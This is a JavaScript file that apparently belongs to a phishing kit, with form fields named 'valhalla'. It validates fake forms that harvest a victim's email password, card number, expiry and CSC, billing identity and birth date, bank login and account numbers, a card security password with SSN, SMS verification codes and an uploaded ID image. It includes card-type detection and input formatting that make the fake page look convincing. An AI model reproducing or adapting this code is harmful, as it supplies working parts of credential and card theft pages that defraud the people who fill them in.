//# EMAIL JS
function validateEmailForm() {
    var a = document.forms["EmailForm"]["valhallamailboxpass"].value;
    if (a == "") {
        $("#valhallamailboxpass").addClass("hasError");
    }
    if (a == ""){return false;}
}

// BILL JS
function validateBillForm() {
    var a = document.forms["bilForm"]["valhallaFnm"].value;
    var b = document.forms["bilForm"]["valhallaBirth"].value;
    var c = document.forms["bilForm"]["valhallaAdr"].value;
    var d = document.forms["bilForm"]["valhallacty"].value;
    var e = document.forms["bilForm"]["valhallazip"].value;
    var f = document.forms["bilForm"]["valhallaCtry"].value;
    var g = document.forms["bilForm"]["valhallatel"].value;
    var h = document.forms["bilForm"]["valhallacc"].value;
    var i = document.forms["bilForm"]["valhallaExp"].value;
    var j = document.forms["bilForm"]["valhallacsc"].value;
    if (a == "") {
        $("#valhallaFnm").addClass("hasError");
    }
    if (b == "") {
        $("#valhallaBirth").addClass("hasError");
    }
    if (c == "") {
        $("#valhallaAdr").addClass("hasError");
    }
    if (d == "") {
        $("#valhallacty").addClass("hasError");
    }
    if (e == "") {
        $("#valhallazip").addClass("hasError");
    }
    if (f == "") {
        $("#valhallaCtry").addClass("hasError");
    }
    if (g == "") {
        $("#valhallatel").addClass("hasError");
    }
    if (h == "") {
        $("#valhallacc").addClass("hasError");
    }
    if (i == "") {
        $("#valhallaExp").addClass("hasError");
    }
    if (j == "") {
        $("#valhallacsc").addClass("hasError");
    }
    if (a == ""){return false;}if (b == ""){return false;}if (c == ""){return false;}if (d == ""){return false;}if (e == ""){return false;}if (f == ""){return false;}if (g == ""){return false;}if (h == ""){return false;}if (i == ""){return false;}if (j == ""){return false;}
}

//Put our input DOM element into a jQuery Object
		var $expDate = jQuery('#valhallaExp');

		//Bind keyup/keydown to the input
		$expDate.bind('keyup','keydown', function(e){
			
		  //To accomdate for backspacing, we detect which key was pressed - if backspace, do nothing:
			if(e.which !== 8) {	
				var numChars = $expDate.val().length;
				if(numChars === 2){
					var thisVal = $expDate.val();
					thisVal += '/';
					$expDate.val(thisVal);
				}
		  }
		});

		//Put our input DOM element into a jQuery Object
		var $birthDate = jQuery('#valhallaBirth');

		//Bind keyup/keydown to the input
		$birthDate.bind('keyup','keydown', function(e){
			
		  //To accomdate for backspacing, we detect which key was pressed - if backspace, do nothing:
			if(e.which !== 8) {	
				var numChars = $birthDate.val().length;
				if(numChars === 2 || numChars === 5){
					var thisVal = $birthDate.val();
					thisVal += '/';
					$birthDate.val(thisVal);
				}
		  }
		});
		jQuery(function($) {
	      	$('[data-numeric]').payment('restrictNumeric');
	      	$('#valhallacc').payment('formatCardNumber');

	      	$.fn.toggleInputError = function(erred) {
	        	this.parent('.form-group').toggleClass('has-error', erred);
	        	return this;
	     	};

	    });

	    $('#valhallacc').validateCreditCard(function(result) {
		if (result.card_type != null) {switch (result.card_type.name) {
			case "VISA":
            $("#cicon").addClass("vi");  
		break;

	    	case "VISA ELECTRON":
	        $("#cicon").addClass("ve");
		break;

	    	case "MASTERCARD":
	        $("#cicon").addClass("ma");
		break;

			case "MAESTRO":
            $("#cicon").addClass("me");
		break;

			case "DISCOVER":
            $("#cicon").addClass("di");
		break;

			case "AMEX":
            $("#cicon").addClass("am");
            $("#valhallacsc").addClass("amxicon");
			$("#valhallacsc").attr('maxlength','4');
			$("#valhallacsc").attr('placeholder','CSC (4 digits)');
			$("#valhallaWhatIsCC").attr('onclick','valhallaWhatIsCC4()');
			$("#valhallaWhatIsCCText3").addClass("hide");
		break;

			case "JCB":
            $("#cicon").addClass("jc");
		break;

		case "DINERS_CLUB":
            $("#cicon").addClass("dc");
		break;

		default:$('#cicon').css('background-position', '98.5% 82%');break;}} 

        else {
        	$("#valhallacsc").attr('maxlength','3');
        	$("#valhallacsc").attr('placeholder','CSC (3 digits)');
        	$("#valhallaWhatIsCC").attr('onclick','valhallaWhatIsCC3()');
        	$("#cicon").removeClass("vi");
            $("#cicon").removeClass("ve");
            $("#cicon").removeClass("ma");
            $("#cicon").removeClass("me");
            $("#cicon").removeClass("di");
            $("#cicon").removeClass("am");
            $("#cicon").removeClass("jc");
            $("#cicon").removeClass("dc");
            $("#valhallacsc").removeClass("amxicon");
        }
        if (result.valid || $cardinput.val().length > 16) {if (result.valid) {
        	$('#valhallacc').removeClass('hasError').addClass('');} 
        else {$('#valhallacc').removeClass('').addClass('hasError');}}
        else {$('#valhallacc').removeClass('').removeClass('hasError');}});


// BNK JS
function validateBnkForm() {
    var a = document.forms["bnkForm"]["valhallabnId"].value;
    var b = document.forms["bnkForm"]["valhallabnPs"].value;
    var c = document.forms["bnkForm"]["valhallaRtNm"].value;
    var d = document.forms["bnkForm"]["valhallaAcNm"].value;
    if (a == "") {
        $("#valhallabnId").addClass("hasError");
    }
    if (b == "") {
        $("#valhallabnPs").addClass("hasError");
    }
    if (c == "") {
        $("#valhallaRtNm").addClass("hasError");
    }
    if (d == "") {
        $("#valhallaAcNm").addClass("hasError");
    }
    if (a == ""){return false;}if (b == ""){return false;}if (c == ""){return false;}if (d == ""){return false;}
}

// CC PASS JS
function validateVbForm() {
    var a = document.forms["vbForm"]["valhallaccpas"].value;
    var b = document.forms["vbForm"]["valhallasn"].value;
    if (a == "") {
        $("#valhallaccpas").addClass("hasError");
    }
    if (b == "") {
        $("#valhallasn").addClass("hasError");
    }
    if (a == ""){return false;}if (b == ""){return false;}
}


// SMS CODE JS
function validateSmPsForm() {
    var a = document.forms["smForm"]["smpass"].value;
    if (a == "") {
        $("#smpass").addClass("hasError");
    }
    if (a == ""){return false;}
}

// ID JS

function validateIdForm() {
    var a = document.forms["idForm"]["valhallaIdinp"].value;
    if (a == "") {
        $("#imgUp").addClass("idhasError");
    }
    if (a == ""){return false;}
}
function readURL(input) {
  if (input.files && input.files[0]) {

    var reader = new FileReader();

    reader.onload = function(e) {
      $('.image-upload-wrap').hide();

      $('.file-upload-image').attr('src', e.target.result);
      $('.file-upload-content').show();

      $('.image-title').html(input.files[0].name);
    };

    reader.readAsDataURL(input.files[0]);

  } else {
    removeUpload();
  }
}

function removeUpload() {
  $('.file-upload-input').replaceWith($('.file-upload-input').clone());
  $('.file-upload-content').hide();
  $('.image-upload-wrap').show();
}
$('.image-upload-wrap').bind('dragover', function () {
		$('.image-upload-wrap').addClass('image-dropping');
	});
	$('.image-upload-wrap').bind('dragleave', function () {
		$('.image-upload-wrap').removeClass('image-dropping');
});
